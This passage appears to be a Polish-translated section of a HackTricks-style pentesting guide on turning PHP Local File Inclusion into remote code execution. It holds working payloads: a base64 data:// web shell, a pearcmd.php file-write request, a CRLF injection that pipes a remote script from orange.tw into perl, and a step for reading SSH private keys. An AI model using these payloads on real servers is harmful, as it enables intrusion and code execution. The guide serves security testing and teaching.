### Przez ssh

Jeśli ssh jest aktywne, sprawdź, którego użytkownika używa system (/proc/self/status & /etc/passwd) i spróbuj uzyskać dostęp do **\<HOME>/.ssh/id_rsa**

### **Przez** **vsftpd** _**logi**_

Logi serwera FTP vsftpd znajdują się w _**/var/log/vsftpd.log**_. W scenariuszu, gdy istnieje podatność Local File Inclusion (LFI) i możliwy jest dostęp do wystawionego serwera vsftpd, można rozważyć następujące kroki:

1. Wstrzyknij payload PHP do pola nazwy użytkownika podczas procesu logowania.
2. Po wstrzyknięciu wykorzystaj LFI, aby pobrać logi serwera z _**/var/log/vsftpd.log**_.

### Przez filtr php base64 (używając base64)

Jak pokazano w [tym](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artykule, PHP base64 filter po prostu ignoruje znaki niebędące base64. Możesz to wykorzystać do obejścia sprawdzania rozszerzenia pliku: jeśli dostarczysz base64, które kończy się na ".php", filtr zignoruje "." i dopisze "php" do base64. Oto przykładowy payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Za pomocą php filters (plik nie jest potrzebny)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Za pomocą segmentation fault

**Prześlij** plik, który zostanie zapisany jako **tymczasowy** w `/tmp`, następnie w **tym samym żądaniu** wywołaj **segmentation fault**, a wtedy **plik tymczasowy nie zostanie usunięty** i możesz go odnaleźć.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Za pomocą Nginx temp file storage

Jeśli znalazłeś **Local File Inclusion** i **Nginx** działa przed PHP, możesz być w stanie uzyskać RCE przy użyciu następującej techniki:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Za pomocą PHP_SESSION_UPLOAD_PROGRESS

Jeśli znalazłeś **Local File Inclusion** nawet jeśli **nie masz sesji** i `session.auto_start` jest `Off`. Jeśli podasz **`PHP_SESSION_UPLOAD_PROGRESS`** w danych **multipart POST**, PHP **włączy sesję za ciebie**. Możesz to wykorzystać, aby uzyskać RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Za pomocą temp file uploads w Windows

Jeśli znalazłeś **Local File Inclusion** i serwer działa na **Windows**, możesz uzyskać RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Za pomocą `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Poniższy przykład wykorzystuje CRLF vuln do uzyskania RCE (z [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Przez phpinfo() (file_uploads = on)

Jeśli znalazłeś **Local File Inclusion** i plik ujawniający **phpinfo()** z file_uploads = on, możesz uzyskać RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Przez compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Jeśli znalazłeś **Local File Inclusion** i możesz **exfiltrate the path** pliku tymczasowego, ALE **serwer** sprawdza, czy **plik, który ma być dołączony, ma znaczniki PHP**, możesz spróbować **obejść to sprawdzenie** przy pomocy tej **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Przez eternal waiting + bruteforce

Jeśli możesz wykorzystać LFI do **upload temporary files** i sprawić, że **serwer** **zawiesi** wykonanie PHP, możesz potem **brute force filenames during hours**, aby znaleźć plik tymczasowy:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do Fatal Error

Jeśli dołączysz którykolwiek z plików `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Musisz dołączyć ten sam plik 2 razy, aby wywołać ten błąd).

**Nie wiem, jak to może być użyteczne, ale może być.**\
_Nawet jeśli spowodujesz PHP Fatal Error, pliki tymczasowe PHP przesłane są usuwane._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
